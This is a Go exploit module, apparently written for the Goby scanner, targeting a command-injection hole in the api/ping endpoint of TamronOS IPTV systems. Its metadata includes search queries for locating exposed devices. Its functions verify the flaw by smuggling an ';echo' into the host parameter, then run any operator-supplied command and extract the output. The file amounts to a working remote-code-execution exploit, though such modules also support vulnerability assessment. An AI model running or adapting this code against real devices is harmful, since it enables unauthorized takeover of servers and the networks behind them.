package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "TamronOS IPTV ping RCE",
    "Description": "There is an arbitrary command execution vulnerability in the api/ping of tamronos IPTV system, through which attackers can execute arbitrary commands",
    "Impact": "TamronOS IPTV ping RCE",
    "Recommendation": "<p>The official has not fixed this vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.tamronos.com/products/iptv\">http ://www.tamronos.com/products/iptv</a></p><p>1. If not necessary, it is forbidden to access the device from the public network. </p><p>2. Set access policies and whitelist access through firewalls and other security devices</p>",
    "Product": "TamronOS IPTV",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "Translation": {
        "CN": {
            "Name": "TamronOS-IPTV 系统 远程命令执行漏洞",
            "Description": "<p>TamronOS IPTV系统是一套针对宽带运营商、酒店、学校等大流量场景的直播、点播系统解决方案。</p><p>IPTV系统api/ping存在远程命令执行漏洞，通过构造http请求，攻击者可以在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Impact": "<p>IPTV系统api/ping存在远程命令执行漏洞，通过构造http请求，攻击者可以在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"http://www.tamronos.com/products/iptv\" rel=\"nofollow\">http://www.tamronos.com/products/iptv</a><br></p><p>1、如⾮必要，禁⽌公⽹访问该设备。</p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问<br><br></p>",
            "Product": "TamronOS-IPTV系统",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "TamronOS IPTV ping RCE",
            "Description": "There is an arbitrary command execution vulnerability in the api/ping of tamronos IPTV system, through which attackers can execute arbitrary commands",
            "Impact": "TamronOS IPTV ping RCE",
            "Recommendation": "<p>The official has not fixed this vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.tamronos.com/products/iptv\" rel=\"nofollow\">http ://www.tamronos.com/products/iptv</a><br></p><p>1. If not necessary, it is forbidden to access the device from the public network. </p><p>2. Set access policies and whitelist access through firewalls and other security devices<br><br></p>",
            "Product": "TamronOS IPTV",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "FofaQuery": "title=\"TamronOS IPTV系统\" || body=\"TamronOS\"",
    "GobyQuery": "title=\"TamronOS IPTV系统\" || body=\"TamronOS\"",
    "Author": "PeiQi",
    "Homepage": "http://www.tamronos.com/",
    "DisclosureDate": "2021-06-15",
    "References": [
        "http://wiki.peiqi.tech"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "Cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "TamronOS IPTV"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(8)
			uri := "/api/ping?count=5&host=;echo+" + randStr + "\"\"" + randStr + ";"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, randStr+randStr)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["Cmd"].(string)
			uri := "/api/ping?count=5&host=;" + url.QueryEscape(cmd) + ";"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					re := regexp.MustCompile(`"result":"(.*?)"`).FindStringSubmatch(resp.RawBody)[1]
					expResult.Output = re
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
